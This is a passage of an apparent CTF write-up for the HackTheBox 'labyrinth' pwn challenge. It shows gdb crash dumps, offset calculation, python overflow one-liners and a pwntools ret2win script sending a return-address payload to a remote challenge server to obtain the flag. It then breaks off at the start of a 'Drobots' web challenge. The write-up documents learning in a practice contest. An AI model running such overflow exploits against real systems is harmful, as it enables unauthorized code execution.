</span></span><span class="line"><span class="cl">0008| 0x7fffffffdd80 --&gt; 0x2d2062 (&#39;b -&#39;)
</span></span><span class="line"><span class="cl">0016| 0x7fffffffdd88 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)
</span></span><span class="line"><span class="cl">0024| 0x7fffffffdd90 --&gt; 0x100000000 
</span></span><span class="line"><span class="cl">0032| 0x7fffffffdd98 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
</span></span><span class="line"><span class="cl">0040| 0x7fffffffdda0 --&gt; 0x0 
</span></span><span class="line"><span class="cl">0048| 0x7fffffffdda8 --&gt; 0x78a85a85f5d4e10b 
</span></span><span class="line"><span class="cl">0056| 0x7fffffffddb0 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)
</span></span><span class="line"><span class="cl">[------------------------------------------------------------------------------]
</span></span><span class="line"><span class="cl">Legend: code, data, rodata, value
</span></span><span class="line"><span class="cl">Stopped reason: SIGSEGV
</span></span><span class="line"><span class="cl">0x0000000000401602 in main ()
</span></span></code></pre></td></tr></table>
</div>
</div><p>The RBP contains an overflow address <code>0x6241376241366241</code>. Calculating offset:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_offset</span><span class="o">.</span><span class="n">rb</span> <span class="o">-</span><span class="n">q</span> <span class="mh">0x6241376241366241</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exact</span> <span class="n">match</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">48</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Double checking offset:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python -c &#39;print(&#34;A&#34;*48+&#34;B&#34;*8)&#39;
</span></span><span class="line"><span class="cl">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
</span></span></code></pre></td></tr></table>
</div>
</div><p>gdb test</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[----------------------------------registers-----------------------------------]                                    
</span></span><span class="line"><span class="cl">RAX: 0x0                                                                                                            
</span></span><span class="line"><span class="cl">RBX: 0x0                                                                                                            
</span></span><span class="line"><span class="cl">RCX: 0x7ffff7d14a37 (&lt;write+23&gt;:        cmp    rax,0xfffffffffffff000)                                              
</span></span><span class="line"><span class="cl">RDX: 0x0                                                                                                            
</span></span><span class="line"><span class="cl">RSI: 0x7fffffffbc20 --&gt; 0x6d31333b315b1b0a                                                                          
</span></span><span class="line"><span class="cl">RDI: 0x7fffffffbb00 --&gt; 0x7ffff7c620d0 (&lt;funlockfile&gt;:  endbr64)                                                    
</span></span><span class="line"><span class="cl">RBP: 0x4242424242424242 (&#39;BBBBBBBB&#39;)                                                                                
</span></span><span class="line"><span class="cl">RSP: 0x7fffffffdd80 --&gt; 0x0                                                                                         
</span></span><span class="line"><span class="cl">RIP: 0x7ffff7c2000a --&gt; 0x1000000000000                                                                             
</span></span><span class="line"><span class="cl">R8 : 0x23 (&#39;#&#39;)                                                                                                     
</span></span><span class="line"><span class="cl">R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])                                                               
</span></span><span class="line"><span class="cl">R10: 0x20554f59205d2d5b (&#39;[-] YOU &#39;)                                                                                
</span></span><span class="line"><span class="cl">R11: 0x246                                                                                                          
</span></span><span class="line"><span class="cl">R12: 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)             
</span></span><span class="line"><span class="cl">R13: 0x401405 (&lt;main&gt;:  push   rbp)                                                                                 
</span></span><span class="line"><span class="cl">R14: 0x0                                                                                                            
</span></span><span class="line"><span class="cl">R15: 0x7ffff7ffd040 --&gt; 0x7ffff7ffe2e0 --&gt; 0x0                                                                      
</span></span><span class="line"><span class="cl">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)                                   
</span></span><span class="line"><span class="cl">[-------------------------------------code-------------------------------------]                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c20003:      add    BYTE PTR [rax],cl                                                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c20005:      add    BYTE PTR [rax],al                                                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c20007:      add    BYTE PTR [rdi+0x7e],dl                                                               
</span></span><span class="line"><span class="cl">=&gt; 0x7ffff7c2000a:      add    BYTE PTR [rax],al                                                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c2000c:      add    BYTE PTR [rax],al                                                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c2000e:      add    BYTE PTR [rax],al                                                                    
</span></span><span class="line"><span class="cl">   0x7ffff7c20010:      add    DWORD PTR [rax],eax                                                                  
</span></span><span class="line"><span class="cl">   0x7ffff7c20012:      add    BYTE PTR [rax],al                                                                    
</span></span><span class="line"><span class="cl">[------------------------------------stack-------------------------------------]                                    
</span></span><span class="line"><span class="cl">0000| 0x7fffffffdd80 --&gt; 0x0                                                                                        
</span></span><span class="line"><span class="cl">0008| 0x7fffffffdd88 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)                                                         
</span></span><span class="line"><span class="cl">0016| 0x7fffffffdd90 --&gt; 0x100000000                                                                                
</span></span><span class="line"><span class="cl">0024| 0x7fffffffdd98 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)                                                                                                             
</span></span><span class="line"><span class="cl">0032| 0x7fffffffdda0 --&gt; 0x0                                                                                        
</span></span><span class="line"><span class="cl">0040| 0x7fffffffdda8 --&gt; 0xb6dc04cf7d4b5e83                                                                         
</span></span><span class="line"><span class="cl">0048| 0x7fffffffddb0 --&gt; 0x7fffffffde88 --&gt; 0x7fffffffe1da (&#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth&#34;)                                                                                                             
</span></span><span class="line"><span class="cl">0056| 0x7fffffffddb8 --&gt; 0x401405 (&lt;main&gt;:      push   rbp)                                                         
</span></span><span class="line"><span class="cl">[------------------------------------------------------------------------------]                                    
</span></span><span class="line"><span class="cl">Legend: code, data, rodata, value                                                                                   
</span></span><span class="line"><span class="cl">Stopped reason: SIGSEGV                                                                                             
</span></span><span class="line"><span class="cl">0x00007ffff7c2000a in ?? () from ./glibc/libc.so.6 
</span></span></code></pre></td></tr></table>
</div>
</div><p>RBP: 0x4242424242424242 (&lsquo;BBBBBBBB&rsquo;). We know our overflow is successful, and now we can put whatever payload for the return function.</p>
<p>First we can try pointing to the start of escape plan:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | ./labyrinth
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">Would you like to change the door you chose?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 
</span></span><span class="line"><span class="cl">[-] YOU FAILED TO ESCAPE!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zsh: done                python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | 
</span></span><span class="line"><span class="cl">zsh: segmentation fault  ./labyrinth
</span></span></code></pre></td></tr></table>
</div>
</div><p>Unfortunately preparing it this way does not work so well. I found a <a class="link" href="https://mregraoncyber.com/rop-emporium-writeup-ret2win/"  target="_blank" rel="noopener"
    >writeup</a> for a similar ret2win problem that discusses the need for an additional return due in newer Ubuntu versions due to a MOVAPS issue. I&rsquo;ll try this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python2 -c &#39;print(&#34;69+\n&#34;+&#34;A&#34;*48+&#34;\x16\x10\x40\x00\x00\x00\x00\x00&#34;+&#34;\x55\x12\x40\x00\x00\x00\x00\x00&#34;)&#39; | ./labyrinth
</span></span><span class="line"><span class="cl">&lt;...snip...&gt;
</span></span><span class="line"><span class="cl">Would you like to change the door you chose?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;&gt; 
</span></span><span class="line"><span class="cl">[-] YOU FAILED TO ESCAPE!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                \O/               
</span></span><span class="line"><span class="cl">                 |                 
</span></span><span class="line"><span class="cl">                / \               
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">-                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">zsh: done                python2 -c  | 
</span></span><span class="line"><span class="cl">zsh: segmentation fault  ./labyrinth
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have a happy escapee, but we don&rsquo;t see the victory text or our flag. The return seems successful, but our target address isn&rsquo;t quite right? After this step I decided to write a python script that will be able to connect to the remote server and submit our payload. Lastly, after guessing a few addresses within escape_plan, I finally landed on one that works.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#elf = ELF(&#39;labyrinth&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;167.172.50.208&#39;</span><span class="p">,</span> <span class="mi">30667</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">48</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401256</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;69&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;(ROPE{.*?})&#34;</span><span class="p">,</span><span class="n">response</span><span class="o">.</span><span class="n">decode</span><span class="p">()))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Full output from payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">python</span> <span class="n">escape</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">178.62</span><span class="o">.</span><span class="mf">9.10</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">31908</span><span class="p">:</span> <span class="n">Done</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">cyber_apocalyse</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">challenge</span><span class="o">/</span><span class="n">e2</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span> <span class="n">BytesWarning</span><span class="p">:</span> <span class="n">Text</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">bytes</span><span class="p">;</span> <span class="n">assuming</span> <span class="n">ASCII</span><span class="p">,</span> <span class="n">no</span> <span class="n">guarantees</span><span class="o">.</span> <span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">pwntools</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="c1">#bytes</span>
</span></span><span class="line"><span class="cl">  <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;69&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>           <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>     <span class="n">O</span>     <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>    <span class="s1">&#39;|&#39;</span>    <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>    <span class="o">/</span> \    <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="n">Select</span> <span class="n">door</span><span class="p">:</span>                                                                                                        
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">001</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">002</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">003</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">004</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">005</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">006</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">007</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">008</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">009</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">010</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">011</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">012</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">013</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">014</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">015</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">016</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">017</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">018</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">019</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">020</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">021</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">022</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">023</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">024</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">025</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">026</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">027</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">028</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">029</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">030</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">031</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">032</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">033</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">034</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">035</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">036</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">037</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">038</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">039</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">040</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">041</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">042</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">043</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">044</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">045</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">046</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">047</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">048</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">049</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">050</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">051</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">052</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">053</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">054</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">055</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">056</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">057</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">058</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">059</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">060</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">061</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">062</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">063</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">064</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">065</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">066</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">067</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">068</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">069</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">070</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">071</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">072</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">073</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">074</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">075</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">076</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">077</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">078</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">079</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">080</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">081</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">082</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">083</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">084</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">085</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">086</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">087</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">088</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">089</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">090</span>                 
</span></span><span class="line"><span class="cl"><span class="n">Door</span><span class="p">:</span> <span class="mi">091</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">092</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">093</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">094</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">095</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">096</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">097</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">098</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">099</span> <span class="n">Door</span><span class="p">:</span> <span class="mi">100</span>                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span>                                                                                                                  
</span></span><span class="line"><span class="cl"><span class="n">You</span> <span class="n">are</span> <span class="n">heading</span> <span class="n">to</span> <span class="n">open</span> <span class="n">the</span> <span class="n">door</span> <span class="n">but</span> <span class="n">you</span> <span class="n">suddenly</span> <span class="n">see</span> <span class="n">something</span> <span class="n">on</span> <span class="n">the</span> <span class="n">wall</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Fly like a bird and be free!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Would</span> <span class="n">you</span> <span class="n">like</span> <span class="n">to</span> <span class="n">change</span> <span class="n">the</span> <span class="n">door</span> <span class="n">you</span> <span class="n">chose</span><span class="err">?</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">YOU</span> <span class="n">FAILED</span> <span class="n">TO</span> <span class="n">ESCAPE</span><span class="o">!</span>                                                                                           
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl">                \<span class="n">O</span><span class="o">/</span>                                                                                                 
</span></span><span class="line"><span class="cl">                 <span class="o">|</span>                                                                                                  
</span></span><span class="line"><span class="cl">                <span class="o">/</span> \                                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span>   <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>           <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>           <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>           <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span><span class="o">-</span><span class="err"></span>        <span class="err"></span>           <span class="err"></span>          <span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl"><span class="err"></span>                                                                                 
</span></span><span class="line"><span class="cl">                                                                                                                    
</span></span><span class="line"><span class="cl"><span class="n">Congratulations</span> <span class="n">on</span> <span class="n">escaping</span><span class="o">!</span> <span class="n">Here</span> <span class="n">is</span> <span class="n">a</span> <span class="n">sacred</span> <span class="n">spell</span> <span class="n">to</span> <span class="n">help</span> <span class="n">you</span> <span class="k">continue</span> <span class="n">your</span> <span class="n">journey</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="n">HTB</span><span class="p">{</span><span class="mi">3</span><span class="n">sc4p3_fr0m_4b0v3</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We managed to get the flag, but working out the address ended up as guess-and-check for me.
<code>HTB{3sc4p3_fr0m_4b0v3}</code></p>
<h2 id="web">Web
</h2><h3 id="drobots">Drobots
</h3><blockquote>
<p>Pandora&rsquo;s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?
<strong>Difficulty: very easy</strong></p>
</blockquote>
<hr>
<p>Visiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it&rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
